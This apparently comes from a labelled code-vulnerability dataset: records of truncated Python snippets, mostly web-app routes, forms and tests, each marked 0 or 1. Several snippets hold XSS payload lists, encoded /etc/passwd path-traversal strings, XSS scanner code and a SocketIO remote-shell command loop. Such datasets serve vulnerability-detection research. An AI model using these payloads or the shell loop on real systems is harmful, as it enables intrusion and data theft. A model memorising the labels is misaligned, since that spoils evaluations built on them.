@app.route('/',methods=['GET']) def shell(): return html @socketio.on('sendMSG') def sendMSG(message): print(\"OUTPUT> \"+str(message)) command=raw_input(\"CMD> \") emit(", "label": 0}, {"snippet_id": 25957, "code": " response.items(): self.fields[key]=value value.initial=data.get('question_form_data',{}).get(key) class BaseInvoiceAddressForm(forms.ModelForm): vat_warning=False class Meta: model=InvoiceAddress fields=", "label": 0}, {"snippet_id": 25081, "code": " zxf{zipped_course} -C{courses_dir}'.format( zipped_course=zipped_course, courses_dir=self.imports_dir, ) ) def generate_html_reports(self): \"\"\" Runs pa11ycrawler json-to-html \"\"\" cmd_str=( 'pa11ycrawler", "label": 0}, {"snippet_id": 8179, "code": "-login'), url(r'^openid/complete/$', 'external_auth.views.openid_login_complete', name='openid-complete'), url(r'^openid/logo.gif$', 'django_openid_auth.views.logo', name='openid-logo'), ) if settings.MITX_FEATURES", "label": 0}, {"snippet_id": 37617, "code": "(route): \treturn frappe.db.get_value(\"Blog Category\",{\"name\": route}, \"title\") or route def get_blog_list(doctype, txt=None, filters=None, limit_start=0, limit_page_length=20, order_by=None): \tconditions=[", "label": 0}, {"snippet_id": 30527, "code": ".getvalue('rows1') \tgrep=form.getvalue('grep') \thour=form.getvalue('hour') \tminut=form.getvalue('minut') \thour1=form.getvalue('hour1') \tminut1=form.getvalue('minut1') \tdate=hour+':'+minut \tdate1=hour1+':'", "label": 0}, {"snippet_id": 5444, "code": "'onpageshow', 'onpaste', 'onpause', 'onplay', 'onplaying', 'onpopstate', 'onprogress', 'onratechange', 'onreset', 'onresize', 'onscroll', 'onsearch', 'onseeked', 'onseeking', 'onselect', 'onselectionchange', ", "label": 0}, {"snippet_id": 36960, "code": "\twhere published=1 \t\tand exists(select name from `tabBlog Post` \t\t\twhere `tabBlog Post`.blog_category=`tabBlog Category`.name and published=1) \t\torder by title asc\"\"\", as_dict=1) def clear_blog_cache()", "label": 0}, {"snippet_id": 22756, "code": " 'courseware.views.course_info', name=\"course_root\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/info$', 'courseware.views.course_info', name=\"info\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]", "label": 0}, {"snippet_id": 10474, "code": " expected command to run pa11ycrawler. \"\"\" expected_statement=( 'pa11ycrawler run{start_urls} ' '--pa11ycrawler-allowed-domains=localhost ' '--pa11ycrawler-reports-dir={report_dir} ' '--pa11ycrawler-deny-url", "label": 0}, {"snippet_id": 25448, "code": "'widget') or self.widget)( scheme=self.scheme, field=self, **kwargs.pop('widget_kwargs',{}) ) defaults.update(**kwargs) for fname, label, size in self.scheme['fields']: defaults['label']=label field=forms", "label": 0}, {"snippet_id": 42308, "code": " convert_dates_to_str=False): \t\tdoc=self.get_valid_dict(convert_dates_to_str=convert_dates_to_str) \t\tdoc[\"doctype\"]=self.doctype \t\tfor df in self.meta.get_table_fields(): \t\t\tchildren=self.get(df.fieldname) or[] \t", "label": 0}, {"snippet_id": 22147, "code": " url(r'^update_certificate$', 'certificates.views.update_certificate'), url(r'^$', 'branding.views.index', name=\"root\"), url(r'^dashboard$', 'student.views.dashboard', name=\"dashboard\"), url(r'^login$'", "label": 0}, {"snippet_id": 54283, "code": "=Entry(main) target.insert(0,'http://') global cookie cookie=Entry(main) global method method=ttk.Combobox(main, values=[\"GET & POST\", \"GET\", \"POST\"]) global timeout timeout=ttk.Combobox(main, values=range", "label": 0}, {"snippet_id": 21863, "code": ".gif$', 'django_openid_auth.views.logo', name='openid-logo'), ) if settings.MITX_FEATURES.get('AUTH_USE_SHIB'): urlpatterns +=( url(r'^shib-login/$', 'external_auth.views.shib_login', name='shib-login'), )", "label": 0}, {"snippet_id": 34448, "code": ".__dict__[key]=[] \t\t\tself.extend(key, value) \t\telse: \t\t\tself.__dict__[key]=value \tdef delete_key(self, key): \t\tif key in self.__dict__: \t\t\tdel self.__dict__[key] \tdef append(self, key, value=None): \t\tif", "label": 0}, {"snippet_id": 53630, "code": "=coords[bundled['coordinator']] workflow=Workflow(document=coord.dependencies.all()[0]) wf_dir=Submission(request.user, workflow, request.fs, request.jt, properties).deploy() deployment_mapping['wf_%s_dir' ", "label": 0}, {"snippet_id": 52642, "code": "='pig': parameters=parameters.union(set(find_dollar_variables(data))) response['status']=0 response['parameters']=list(parameters) except Exception, e: response['message']=str(e) return HttpResponse(json", "label": 0}, {"snippet_id": 51754, "code": " MEDIA_ROOT=os.environ.get('MEDIA_ROOT', os.path.abspath(os.path.dirname(__file__)) +'/uploads/') UPLOAD_ROOT=os.environ.get('MEDIA_ROOT', os.path.abspath(os.path.dirname(__file__)) +'/uploads/') LOGIN_URL", "label": 0}, {"snippet_id": 45597, "code": " json.dumps(doc is None or doc.doc.get().is_editable(request.user)) }) def new_bundle(request): return edit_bundle(request) @check_document_modify_permission() def save_bundle(request): response={'status", "label": 0}, {"snippet_id": 43466, "code": ".ignore_save_passwords is True: \t\t\treturn \t\tfor df in self.meta.get('fields',{'fieldtype':('=', 'Password')}): \t\t\tif self.flags.ignore_save_passwords and df.fieldname in self.flags.ignore_save_passwords", "label": 0}, {"snippet_id": 41442, "code": "\t\t\t\t\t\tand reference_doctype='Blog Post' \t\t\t\t\t\tand reference_name=t1.name) as comments \t\tfrom `tabBlog Post` t1, `tabBlogger` t2 \t\twhere ifnull(t1.published,0)=1 \t\tand t1.blogger=t2.name \t\t%(condition)s", "label": 0}, {"snippet_id": 31118, "code": " tmp_config_path, script)) \tif error: \t\tprint('error: '+error) \t\tsys.exit() \tfunct.upload(slave, tmp_config_path, script) \t \tfunct.ssh_command(master,[\"sudo chmod +x \"+tmp_config_path+script, tmp_config_path+script+", "label": 0}, {"snippet_id": 18625, "code": "]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/add$', 'course_groups.views.add_users_to_cohort', name=\"add_to_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/delete$', ", "label": 0}, {"snippet_id": 39771, "code": "(df.fieldname) \t\t\t\t\tif \t\t\t\t\t\tnot _df.get('fetch_if_empty') \t\t\t\t\t\tor(_df.get('fetch_if_empty') and not self.get(_df.fieldname)) \t\t\t\t] \t\t\t\tif not fields_to_fetch: \t\t\t\t\t \t\t\t\t\tvalues=frappe._dict(name=frappe", "label": 0}, {"snippet_id": 53441, "code": " uuid=bundle_data['uuid'], type='oozie-bundle2', owner=request.user) Document.objects.link(bundle_doc, owner=bundle_doc.owner, name=bundle_doc.name, description=bundle_doc.description, extra='bundle2') if", "label": 0}, {"snippet_id": 6439, "code": "\"\" SSL certificate chain filename \"\"\" return self.config.get(self.section, 'cert_chain') @property def userdb_mongo_uri(self): \"\"\" UserDB MongoDB connection URI(string). See MongoDB documentation for details", "label": 0}, {"snippet_id": 21850, "code": "-login'), url(r'^openid/complete/$', 'external_auth.views.openid_login_complete', name='openid-complete'), url(r'^openid/logo.gif$', 'django_openid_auth.views.logo', name='openid-logo'), ) if settings.MITX_FEATURES", "label": 0}, {"snippet_id": 44110, "code": " def test_facted_page_xss(self, client, project): query='XSS' page_search=PageDocument.faceted_search(query=query, user='') results=page_search.execute() expected=\"\"\" &lt;h3&gt;<em>XSS</em> exploit&lt;&", "label": 0}, {"snippet_id": 22468, "code": " name=\"press\"), url(r'^media-kit$', 'static_template_view.views.render', {'template': 'media-kit.html'}, name=\"media-kit\"), url(r'^faq$', 'static_template_view.views.render', {'template': 'faq.html'}, name", "label": 0}, {"snippet_id": 51279, "code": "(ConstanceAdmin): change_list_form=CustomConfigForm change_list_template='admin/config/settings.html' admin.site.unregister([Config]) admin.site.register([Config], ConfigAdmin) @admin.register(Account)", "label": 0}, {"snippet_id": 52850, "code": "(user, fs, jt, workflow, mapping): try: submission=Submission(user, workflow, fs, jt, mapping) job_id=submission.run() return job_id except RestException, ex: detail=ex._headers.get('oozie-error-message'", "label": 0}, {"snippet_id": 41926, "code": "==None: \t\t\tvalue={} \t\tif isinstance(value,(dict, BaseDocument)): \t\t\tif not self.__dict__.get(key): \t\t\t\tself.__dict__[key]=[] \t\t\tvalue=self._init_child(value, key) \t\t\tself.__dict__[key].append(value) \t\t", "label": 0}, {"snippet_id": 8542, "code": ".reject_name_change'), url(r'^pending_name_changes$', 'student.views.pending_name_changes'), url(r'^event$', 'track.views.user_track'), url(r'^t/(?P<template>[^/]*)$', 'static_template_view.views.index", "label": 0}, {"snippet_id": 29046, "code": "+script +\" PROXY=\" +proxy_serv+ \t\t\t\t\" SOCK_PORT=\"+haproxy_sock_port+\" STAT_PORT=\"+stats_port+\" STAT_FILE=\"+server_state_file+ \t\t\t\t\" STATS_USER=\"+stats_user+\" STATS_PASS=\"+stats_password] \t \terror=str(upload", "label": 0}, {"snippet_id": 44521, "code": "('Workflow copied.')) return HttpResponse(json.dumps(response), mimetype=\"application/json\") @check_document_modify_permission() def save_workflow(request): response={'status': -1} workflow=json.loads(request", "label": 0}, {"snippet_id": 16385, "code": ".render', {'template': 'media-kit.html'}, name=\"media-kit\"), url(r'^faq$', 'static_template_view.views.render', {'template': 'faq.html'}, name=\"faq_edx\"), url(r'^help$', 'static_template_view.views.render", "label": 0}, {"snippet_id": 31892, "code": "\"alert alert-danger\">Upload fail: %s</div>' % error)\t\t\t \t\telse: \t\t\tprint('<div class=\"alert alert-success\" style=\"margin:10px\">Edited '+form.getvalue('color')+' list was uploaded to '+server[1]+'</div>') ", "label": 0}, {"snippet_id": 22966, "code": "<chapter>[^/]*)/(?P<section>[^/]*)/(?P<position>[^/]*)/?$', 'courseware.views.index', name=\"courseware_position\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress$', 'courseware.views.progress'", "label": 0}, {"snippet_id": 26595, "code": "%2f%2e%2e%2fetc%2fpasswd%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e", "label": 0}, {"snippet_id": 51405, "code": " https://docs.djangoproject.com/en/2.1/ref/settings/ \"\"\" import os from datetime import timedelta from django.utils.translation import gettext_lazy as _ BASE_DIR=os.path.dirname(os.path.abspath(__file__))", "label": 0}, {"snippet_id": 40534, "code": " self._precision[cache_key][fieldname] \tdef get_formatted(self, fieldname, doc=None, currency=None, absolute_value=False, translated=False): \t\tfrom frappe.utils.formatters import format_value \t\tdf=self", "label": 0}, {"snippet_id": 48628, "code": "=GroupReservation.objects.get(id=int(request.GET[\"rid\"])) elif u.number_of_allowed_reservations > GroupReservation.objects.all().filter(createdByUser=u).count(): r=GroupReservation() r.createdByUser=u r.ready", "label": 0}, {"snippet_id": 44710, "code": " Document.objects.get_docs(user, Document2, extra='workflow2')] ] def add_node(request): response={'status': -1} node=json.loads(request.POST.get('node', '{}')) properties=json.loads(request.POST.get('properties", "label": 0}, {"snippet_id": 32240, "code": "=argparse.ArgumentParser(prog='md_browser') parser.add_argument('-p', '--port', type=int, default=8080, help='port to run on(default=%(default)s)') parser.add_argument('-d', '--directory', type=str, default", "label": 0}, {"snippet_id": 25494, "code": ".one_required def clean(self, value) -> dict: value=super().clean(value) if self.one_required and(not value or not any(v for v in value)): raise forms.ValidationError(self.error_messages['required'], code=", "label": 0}, {"snippet_id": 33029, "code": ", relative_to=SRC_DIR) self.wfile.write(contents.encode('utf-8')) class _AdjustTOC(markdown.treeprocessors.Treeprocessor): def __init__(self, has_a_single_h1): super(_AdjustTOC, self).__init__() self.has_a_single_h1", "label": 0}, {"snippet_id": 16534, "code": "+/[^/]+)/wiki/', include(wiki_pattern())), ) if settings.COURSEWARE_ENABLED: urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/jump_to/(?P<location>.*)$', 'courseware.views.jump_to', name", "label": 0}, {"snippet_id": 45241, "code": " edit_coordinator(request) @check_document_modify_permission() def save_coordinator(request): response={'status': -1} coordinator_data=json.loads(request.POST.get('coordinator', '{}')) if coordinator_data.get", "label": 0}, {"snippet_id": 10045, "code": "\"SELENIUM_DRIVER_LOG_DIR='{repo_dir}/test_root/log{shard_str}' \" \"VERIFY_XSS='{verify_xss}' \" \"nosetests{repo_dir}/common/test/acceptance/{exp_text} \" \"--with-xunit \" \"--xunit-file={repo_dir}/reports/bok_choy", "label": 0}, {"snippet_id": 27979, "code": " libs import helpers from metrics import logs SESSION_EXPIRY_DAYS=14 class Handler(base_handler.Handler): \"\"\"Login page.\"\"\" @handler.unsupported_on_local_server @handler.get(handler.HTML) def get(self):", "label": 0}, {"snippet_id": 23868, "code": " test_invalid_default_store(self): suite=BokChoyTestSuite('', default_store='invalid') name='tests' self.assertEqual( suite.cmd, self._expected_command(name=name, store='invalid') ) def test_serversonly", "label": 0}, {"snippet_id": 9105, "code": "?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$', 'courseware.views.syllabus', name=\"syllabus\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$', 'staticbook.views.index', name=", "label": 1}, {"snippet_id": 24816, "code": "\"\"\" print 'Bok-choy servers running. Press Ctrl-C to exit...\\n' print 'Note: pressing Ctrl-C multiple times can corrupt noseid files and system state. Just press it once.\\n' while True: try: sleep(10000", "label": 0}, {"snippet_id": 52513, "code": "(user, Document2, extra='workflow2')] ] def add_node(request): response={'status': -1} node=json.loads(request.POST.get('node', '{}')) properties=json.loads(request.POST.get('properties', '{}')) copied_properties", "label": 0}, {"snippet_id": 49472, "code": " SmartListFilter): values=[ SmartFilterValue(self.model_field.parameter_name, choice[1], choice[0], self.query_params) for choice in self.model_field.lookups() ] elif self.model_field.choices: values=[", "label": 0}, {"snippet_id": 34652, "code": "(fieldname) \t\t\t \t\t\tif not sanitize and d[fieldname] is None: \t\t\t\tcontinue \t\t\tdf=self.meta.get_field(fieldname) \t\t\tif df: \t\t\t\tif df.fieldtype==\"Check\": \t\t\t\t\tif d[fieldname]==None: \t\t\t\t\t\td[fieldname]=0 \t", "label": 0}, {"snippet_id": 17855, "code": "'org_id': 'ANUx'}), url(r'^(?i)university_profile/EPFLx$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'EPFLx'}), url(r'^university_profile/(?P<org_id", "label": 0}, {"snippet_id": 37302, "code": " posts=(select count(*) from `tabBlog Post` \t\t\twhere ifnull(blogger,'')=tabBlogger.name) \t\t\twhere name=%s\"\"\",(self.blogger,)) \tdef on_update(self): \t\tclear_cache(\"writers\") \tdef get_context(self, context): ", "label": 0}, {"snippet_id": 10925, "code": "'green', \"Cleaning up databases...\") print msg sh(\"./manage.py lms --settings bok_choy flush --traceback --noinput\") bokchoy_utils.clear_mongo() def verbosity_processes_string(self): \"\"\" Multiprocessing", "label": 0}, {"snippet_id": 15232, "code": "-C testsonly -assume servers are running(as per above) and run tests with no setup or cleaning of environment test_spec -when set, specifies test files, classes, cases, etc. See platform doc. default_store", "label": 0}, {"snippet_id": 37471, "code": ") \tcategory=frappe.local.form_dict.blog_category or frappe.local.form_dict.category \tif category: \t\tcategory_title=get_blog_category(category) \t\tlist_context.sub_title=_(\"Posts filed under{0}\").format(category_title", "label": 1}, {"snippet_id": 33126, "code": " import bq import bulkproc import config import expiration import model import notifications import service import swarming import user README_MD=( 'https://chromium.googlesource.com/infra/infra/+/master", "label": 0}, {"snippet_id": 11292, "code": "=path('test_root/courses/') self.pa11y_report_dir=os.path.join(self.report_dir, 'pa11ycrawler_reports') self.tar_gz_file=\"https://github.com/edx/demo-test-course/archive/master.tar.gz\" self.start_urls=[", "label": 0}, {"snippet_id": 14326, "code": "'), ) if settings.MITX_FEATURES.get('AUTH_USE_OPENID_PROVIDER'): urlpatterns +=( url(r'^openid/provider/login/$', 'external_auth.views.provider_login', name='openid-provider-login'), url(r'^openid/provider", "label": 0}, {"snippet_id": 21794, "code": "\"), ) if settings.MITX_FEATURES.get('ENABLE_STUDENT_HISTORY_VIEW'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/submission_history/(?P<student_username>[^/]*)/(?P<location>.*?)$', 'courseware", "label": 0}, {"snippet_id": 15080, "code": ".start_urls) ) def test_get_test_course(self): suite=Pa11yCrawler('') suite.get_test_course() self._mock_sh.assert_has_calls([ call( 'wget{targz} -O{dir}demo_course.tar.gz'.format(targz=suite.tar_gz_file,", "label": 0}, {"snippet_id": 40792, "code": "=self.meta.get_field(fieldname) \t\tval=self.get(fieldname) \t\treturn self.cast(val, df) \tdef cast(self, value, df): \t\treturn cast_fieldtype(df.fieldtype, value) \tdef _extract_images_from_text_editor(self", "label": 0}, {"snippet_id": 52920, "code": "('editor/list_editor_coordinators.mako', request,{ 'coordinators': coordinators }) @check_document_access_permission() def edit_coordinator(request): coordinator_id=request.GET.get('coordinator') doc=None", "label": 0}, {"snippet_id": 41868, "code": "\tself.set(key,[]) \t\t\t\tvalue=self.__dict__.get(key) \t\t\treturn value \t\telse: \t\t\treturn self.__dict__ \tdef getone(self, key, filters=None): \t\treturn self.get(key, filters=filters, limit=1)[0] \tdef set(self", "label": 0}, {"snippet_id": 53754, "code": ", default='./.elasticbeanstalk/config.yml') parser.add_argument('--name', type=str, required=True, help='The name of the application') parser.add_argument('--region', type=str, required=True, help='The", "label": 0}, {"snippet_id": 54251, "code": ",background='light sky blue').grid(row=9) Label(main, text=\"\",background='light sky blue').grid(row=10) ua=[\"\"] ua+=bane.ua li=bane.read_file('xss.txt') pl=[] for x in li: pl.append(x.strip()) prox=[\"\"]", "label": 1}, {"snippet_id": 35691, "code": "\telse: \t\t\t\tvalue =values.get(fieldname) \t\t\tif self.get(fieldname) !=value: \t\t\t\tfrappe.throw(_(\"Value cannot be changed for{0}\").format(self.meta.get_label(fieldname)), \t\t\t\t\tfrappe.CannotChangeConstantError", "label": 0}, {"snippet_id": 12257, "code": "), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$', 'staticbook.views.html_index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware", "label": 1}, {"snippet_id": 5589, "code": "\", \"\"\"<head><meta http-equiv=\"content-type\" content=\"text/html; charset=utf-7\"> </head>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-\"\"\" ] _waf_payloads=[ \"<IMG SRC=JaVaScRiPt:alert('xss')>\", '<<script", "label": 0}, {"snippet_id": 51076, "code": " 'queue', 'args') form=MyPeriodicTaskForm save_as=True @staticmethod def name_safe(obj): return mark_safe(obj.name) @staticmethod def last_run(obj): return obj.last_run_at @staticmethod def runs(obj): return", "label": 0}, {"snippet_id": 29720, "code": " \t\t\tcontinue \t\tif line !=\"\": \t\t\tback=json.dumps(line).split(\"\\\"\") \t\t\tif kwargs.get('ret'): \t\t\t\tret +=back[1] \t\t\t\tret +=\"<br />\" \t\t\telse: \t\t\t\tprint(back[1], end=\"<br>\") \t\t \tif kwargs.get('ret'): \t\treturn", "label": 0}, {"snippet_id": 10656, "code": ") fasttest -when set, skip various set-up tasks(e.g., collectstatic) serversonly -prepare and run the necessary servers, only stopping when interrupted with Ctrl-C testsonly -assume servers are running", "label": 0}, {"snippet_id": 27905, "code": "(self, url, **kwargs): \"\"\"Explicitly converts url to 'str', because webapp2.RequestHandler.redirect strongly requires 'str' but url might be an unicode string.\"\"\" super(Handler, self).redirect(str(url)", "label": 1}, {"snippet_id": 33189, "code": "' % build_id return self.redirect(api_path) class ViewBuildHandler(auth.AuthenticatingHandler): \"\"\"Redirects to API explorer to see the build.\"\"\" @auth.public def get(self, build_id): try: build_id=int", "label": 0}, {"snippet_id": 17821, "code": "), url(r'^(?i)university_profile/TorontoX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'TorontoX'}), url(r'^(?i)university_profile/RiceX$', 'courseware", "label": 0}, {"snippet_id": 7973, "code": "'course_groups.views.users_in_cohort', name=\"list_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/add$', 'course_groups.views.add_users_to_cohort', name=\"add_to_cohort\")", "label": 0}, {"snippet_id": 22227, "code": "<template>[^/]*)$', 'static_template_view.views.index'), url(r'^accounts/login$', 'student.views.accounts_login', name=\"accounts_login\"), url(r'^login_ajax$', 'student.views.login_user', name=\"login\"),", "label": 0}, {"snippet_id": 18037, "code": " 'course_wiki.views.root_create', name='root_create'), url(r'^wiki/', include(wiki_pattern())), url(r'^notify/', include(notify_pattern())), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/course_wiki/", "label": 0}, {"snippet_id": 46180, "code": " engine=engine) query={'qs':[{'q': ''}], 'fqs':[], 'start': 0} if request.GET.get('format', 'plain')=='json': return JsonResponse({ 'collection': collection.get_props(request.user), 'query': query, 'initial", "label": 0}, {"snippet_id": 25267, "code": ": if value is None: return None data=[] for i, field in enumerate(self.scheme['fields']): fname, label, size=field data.append(value.get(fname, \"\")) if '_legacy' in value and not data[-1]: data[-1]=value", "label": 0}, {"snippet_id": 17396, "code": "'openid-provider-identity'), url(r'^openid/provider/xrds/$', 'external_auth.views.provider_xrds', name='openid-provider-xrds') ) if settings.MITX_FEATURES.get('ENABLE_PEARSON_LOGIN', False): urlpatterns", "label": 0}, {"snippet_id": 32262, "code": ".add_argument('-e', '--external', action='store_true', help='whether to bind to external port') parser.add_argument('file', nargs='?', help='open file in browser') args=parser.parse_args(argv) top_level=os", "label": 0}, {"snippet_id": 18276, "code": "/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter", "label": 1}, {"snippet_id": 23653, "code": "\"\" import os import unittest from mock import patch, call from test.test_support import EnvironmentVarGuard from paver.easy import BuildFailure from pavelib.utils.test.suites import BokChoyTestSuite, Pa11yCrawler", "label": 0}, {"snippet_id": 11741, "code": ", kwargs={'org_id': 'TorontoX'}), url(r'^(?i)university_profile/RiceX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'RiceX'}), url(r'^(?i)university_profile", "label": 0}, {"snippet_id": 7405, "code": ", url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/course_wiki/?$', 'course_wiki.views.course_wiki_redirect', name=\"course_wiki\"), url(r'^courses/(?:[^/]+/[^/]+/[^/]+)/wiki/', include(wiki_pattern())), ", "label": 0}, {"snippet_id": 39249, "code": ", \"_liked_by\", \"__run_link_triggers\"): \t\t\tif self.get(key): \t\t\t\tdoc[key]=self.get(key) \t\treturn doc \tdef as_json(self): \t\treturn frappe.as_json(self.as_dict()) \tdef get_table_field_doctype(self, fieldname", "label": 0}, {"snippet_id": 36273, "code": " Format Builder or in the controller as a list \t\tof hidden fields. Example \t\t\tclass MyDoc(Document): \t\t\t\tdef __setup__(self): \t\t\t\t\tself.print_hide=[\"field1\", \"field2\"] \t\t:param fieldname: Fieldname to be", "label": 0}, {"snippet_id": 229, "code": ": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers,\"res_body\": xss_request.text} dbupdate.insert_record(attack_result) except: logs.logging", "label": 0}, {"snippet_id": 5405, "code": "'ondblclick', 'ondrag', 'ondragend', 'ondragenter', 'ondragleave', 'ondragover', 'ondragstart', 'ondrop', 'ondurationchange', 'onend', 'onemptied', 'onended', 'onerror', 'onfocus', 'onfocusin', 'onfocusout', ", "label": 0}, {"snippet_id": 9122, "code": "+)/book/(?P<book_index>[^/]*)/$', 'staticbook.views.index', name=\"book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.index'), url(r'^courses", "label": 1}, {"snippet_id": 2790, "code": " decoded_payload=xss_payload_decode(payload) if xss_request_url.text.find(decoded_payload) !=-1: impact=check_xss_impact(xss_request_url.headers) attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": url,", "label": 0}, {"snippet_id": 36151, "code": " self._precision[cache_key]: \t\t\tself._precision[cache_key][fieldname]=None \t\t\tdoctype=self.meta.get_field(parentfield).options if parentfield else self.doctype \t\t\tdf=frappe.get_meta(doctype).get_field(fieldname", "label": 0}, {"snippet_id": 47278, "code": "(index_view_url) assert res.status_code==200 with patch('invenio_records.models.RecordMetadata') as db_mock: db_mock.side_effect=SQLAlchemyError() res=client.post( delete_view_url, data={'id': rec_uuid", "label": 0}, {"snippet_id": 34440, "code": ", as_value=False): \t\tif isinstance(value, list) and not as_value: \t\t\tself.__dict__[key]=[] \t\t\tself.extend(key, value) \t\telse: \t\t\tself.__dict__[key]=value \tdef delete_key(self, key): \t\tif key in self.__dict__", "label": 0}, {"snippet_id": 7430, "code": "=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/jump_to/(?P<location>.*)$', 'courseware.views.jump_to', name=\"jump_to\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/modx/(?P<location>.*?)/(?P<dispatch", "label": 0}, {"snippet_id": 15873, "code": "', \"staff\": 'true', \"course_id\": self.course_key, } cms_params=urlencode(auto_auth_params) self.start_urls.append(\"\\\"http://localhost:8031/auto_auth?{}\\\"\".format(cms_params)) sequence_url=\"/api/courses", "label": 0}, {"snippet_id": 17513, "code": ") import edinsights.core.registry urlpatterns +=( url(r'^comm/foldit_ops', 'foldit.views.foldit_ops', name=\"foldit_ops\"), ) if settings.MITX_FEATURES.get('ENABLE_DEBUG_RUN_PYTHON'): urlpatterns +=( url", "label": 0}, {"snippet_id": 49829, "code": "/script> ''' @app.route('/',methods=['GET']) def shell(): return html @socketio.on('sendMSG') def sendMSG(message): print(\"OUTPUT> \"+str(message)) command=raw_input(\"CMD> \") emit(\"getMSG\",command+\"\\n\")", "label": 0}, {"snippet_id": 19338, "code": ") def test_verify_xss(self): suite=BokChoyTestSuite('', verify_xss=True) name='tests' self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True)) def test_verify_xss_env_var(self): self", "label": 1}, {"snippet_id": 50941, "code": ", User from django.contrib.humanize.templatetags.humanize import naturaltime from django.utils.safestring import mark_safe from django_celery_beat.admin import PeriodicTaskAdmin, PeriodicTaskForm from django_celery_beat", "label": 0}, {"snippet_id": 44547, "code": "(request.POST.get('layout', '{}')) if workflow.get('id'): workflow_doc=Document2.objects.get(id=workflow['id']) else: workflow_doc=Document2.objects.create(name=workflow['name'], uuid=workflow['uuid'], type", "label": 0}, {"snippet_id": 11239, "code": ": cmd.append(\"--pdb\") if self.save_screenshots: cmd.append(\"--with-save-baseline\") cmd.append(self.extra_args) cmd=(\" \").join(cmd) return cmd class Pa11yCrawler(BokChoyTestSuite): \"\"\" Sets up test environment", "label": 0}, {"snippet_id": 46770, "code": " K_COMMENT, ONE_HOUR from.react import ReactMixin, ReactItem from.signals import comment_reacted from.utils import RedisSettings markdown=mistune.Markdown() MC_KEY_COMMENT_LIST='comment:%s:comment_list", "label": 0}, {"snippet_id": 4703, "code": "'ondblclick', 'ondrag', 'ondragend', 'ondragenter', 'ondragleave', 'ondragover', 'ondragstart', 'ondrop', 'ondurationchange', 'onend', 'onemptied', 'onended', 'onerror', 'onfocus', 'onfocusin', 'onfocusout', ", "label": 0}, {"snippet_id": 26583, "code": "../../../etc/passwd%00', '%2e%2e%2f%2e%2e%2fetc%2fpasswd%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e", "label": 0}, {"snippet_id": 51133, "code": ".last_run_at) else: return obj.schedule.remaining_estimate(last_run_at=datetime.now(pytz.utc)) @staticmethod def next(obj): if obj.last_run_at: return obj.schedule.remaining_estimate(last_run_at=obj.last_run_at)", "label": 0}, {"snippet_id": 23854, "code": "=spec, default_store='draft') name='tests/{}'.format(spec) self.assertEqual( suite.cmd, self._expected_command(name=name, store='draft') ) def test_invalid_default_store(self): suite=BokChoyTestSuite(''", "label": 0}, {"snippet_id": 42190, "code": "\t\t\t\tif isinstance(d[fieldname], list) and df.fieldtype !='Table': \t\t\t\t\tfrappe.throw(_('Value for{0} cannot be a list').format(_(df.label))) \t\t\t\tif convert_dates_to_str and isinstance(d[fieldname],(datetime", "label": 0}, {"snippet_id": 13939, "code": "(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_next$', 'open_ended_grading.staff_grading_service.get_next', name='staff_grading_get_next'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]", "label": 0}, {"snippet_id": 31028, "code": " \t\tfunct.syn_flood_protect(slave) \t \tos.system(\"cp scripts/%s.\" % script) \t\t \terror=str(funct.upload(master, tmp_config_path, script)) \tif error: \t\tprint('error: '+error) \t\tsys.exit() \tfunct.upload(slave", "label": 0}, {"snippet_id": 25487, "code": "*kwargs ) self.require_all_fields=require_all_fields self.required=self.one_required def clean(self, value) -> dict: value=super().clean(value) if self.one_required and(not value or not any(v for v in value", "label": 0}, {"snippet_id": 4814, "code": "/body> </html> ''' _probes=[ \"\"\"'';!--\"<XSS>=&{()}\"\"\", ] _payloads=[ '<q/oncut=open()>', '<svg/onload=eval(name)>', '<img src=x onerror=alert(/xss/)>', \"\"\"<img 